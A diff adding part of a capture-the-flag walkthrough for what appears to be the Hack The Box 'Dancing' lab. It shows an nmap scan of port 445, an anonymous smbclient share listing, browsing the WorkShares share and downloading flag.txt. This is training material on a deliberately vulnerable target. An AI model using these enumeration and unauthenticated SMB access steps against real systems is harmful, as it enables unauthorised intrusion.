@@ -124,3 +124,49 @@ flag.txt
 Server Message Block
 ```
 **What is the service name for port 445 that came up in our Nmap**
+```console
+$ nmap -p445 -sV -v --min-rate 5000 10.129.168.26 
+....
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+```
+**How many shares are there on Dancing?**
+
+```console
+smbclient --no-pass -L 10.129.168.26                                                                                                                                     1 ⨯
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk      
+SMB1 disabled -- no workgroup available
+
+```
+```console
+smbclient //10.129.50.160/WorkShares                                                                                                                                     1 ⨯
+Enter WORKGROUP\lazy29t's password: 
+```
+
+```console
+smb: \> ls
+  .                                   D        0  -
+  ..                                  D        0  -
+  Amy.J                               D        0  -
+  James.P                             D        0  -
+```
+```console
+smb: \> cd James.P
+smb: \James.P\> ls
+  .                                   D        0  Thu Jun  3 01:38:03 2021
+  ..                                  D        0  Thu Jun  3 01:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 02:26:57 2021
+
+```
+
+```console
+smb: \James.P\> get flag.txt
+getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+```
